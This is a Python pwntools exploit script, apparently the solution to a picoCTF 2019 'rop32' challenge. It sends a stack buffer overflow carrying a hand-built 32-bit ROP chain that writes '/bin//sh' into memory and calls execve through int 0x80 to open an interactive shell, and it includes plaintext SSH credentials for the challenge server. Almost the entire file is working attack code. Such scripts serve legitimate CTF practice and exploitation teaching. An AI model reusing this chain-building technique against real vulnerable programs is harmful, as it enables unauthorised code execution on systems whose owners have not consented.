import binascii
from pwn import *
import sys
from struct import pack

BINARY = './vuln'
context.terminal = ['tmux', 'splitw', '-h']


def attach_gdb(sh):
    gdb.attach(sh)


def P32(v):
    return struct.pack('I', v)


def P64(v):
    return struct.pack('Q', v)


def deHex(v):
    return binascii.unhexlify(v)[::-1]


def start():
    if args["REMOTE"]:
        s = ssh(host='2019shell1.picoctf.com',
                user='mikon', password="password")
        sh = s.process(
            'vuln', cwd='/problems/rop32_4_0636b42072627d283f46d2427804b10c')
    else:
        sh = process(BINARY, stdout=process.PTY, stdin=process.PTY)

    if args["GDB"]:
        attach_gdb(sh)
    return sh


def main():
    sh = start()

    shellcode = asm(shellcraft.sh())
    def send(x): return sh.sendlineafter('\n', x)

    p = ''
    p = "a"*(0x18+4)

    p += pack('<I', 0x0806ee6b) # pop edx ; ret
    p += pack('<I', 0x080da060) # @ .data
    p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
    p += '/bin'
    p += pack('<I', 0x080da060) # padding without overwrite edx
    p += pack('<I', 0x41414141) # padding
    p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806ee6b) # pop edx ; ret
    p += pack('<I', 0x080da064) # @ .data + 4
    p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
    p += '//sh'
    p += pack('<I', 0x080da064) # padding without overwrite edx
    p += pack('<I', 0x41414141) # padding
    p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806ee6b) # pop edx ; ret
    p += pack('<I', 0x080da068) # @ .data + 8
    p += pack('<I', 0x08056420) # xor eax, eax ; ret
    p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x080481c9) # pop ebx ; ret
    p += pack('<I', 0x080da060) # @ .data
    p += pack('<I', 0x0806ee92) # pop ecx ; pop ebx ; ret
    p += pack('<I', 0x080da068) # @ .data + 8
    p += pack('<I', 0x080da060) # padding without overwrite ebx
    p += pack('<I', 0x0806ee6b) # pop edx ; ret
    p += pack('<I', 0x080da068) # @ .data + 8
    p += pack('<I', 0x08056420) # xor eax, eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x08049563) # int 0x80
    send(p)

    sh.interactive()


if __name__ == '__main__':
    main()
